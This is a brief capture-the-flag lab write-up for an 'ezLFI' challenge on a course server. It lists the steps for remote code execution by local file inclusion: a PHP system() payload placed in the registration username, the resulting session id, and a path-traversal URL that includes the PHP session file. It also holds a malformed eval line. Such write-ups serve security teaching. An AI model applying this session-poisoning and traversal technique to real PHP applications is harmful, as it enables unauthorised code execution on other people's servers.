# Lab0x03 Writeup

## ezLFI
1. https://edu-ctf.csie.org:10157/?action=register
post data: user=<?php system("ls /"); ?>

<?php eval('system(ls /);');

2. sessid = tdq3l7c0j4nmn0ovje4dbq5k46
3. finally https://edu-ctf.csie.org:10157/?action=module&m=../../../../var/lib/php/session/sess_tdq3l7c0j4nmn0ovje4dbq5k46